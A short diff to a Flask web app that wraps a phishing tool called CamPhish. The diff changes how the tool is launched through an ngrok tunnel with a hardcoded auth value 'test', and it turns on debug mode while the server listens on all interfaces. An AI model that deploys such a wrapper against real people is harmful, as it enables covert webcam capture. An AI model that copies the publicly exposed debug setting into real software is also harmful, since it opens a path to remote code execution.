@@ -80,17 +80,16 @@ def update(id):
         return render_template('update.html', task=task)
 
 
-@app.route('/CamPhish/', methods=['GET', 'POST'])
+@app.route('/camphish/', methods=['GET', 'POST'])
 def camphish_create() -> str:
     if request.method == 'GET':
         return render_template('Camphish.html', ngrok_url=None)
     else:
-        service = request.form.get('port_forwarding')
         template = request.form.get('template')
         auth = "test"
         # ngrok_url = camphish.camphish(int(service), int(template), autthoken=auth)
         global ngrok_url_thread
-        ngrok_url_thread = camphish.custom_thread(target=camphish.camphish, args=(int(service), int(template), auth),
+        ngrok_url_thread = camphish.custom_thread(target=camphish.camphish, args=(int(template), auth),
                                                   daemon=True)
         ngrok_url_thread.start( )
 
@@ -173,4 +172,4 @@ def process():
 
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0')
+    app.run(host='0.0.0.0', debug=True)
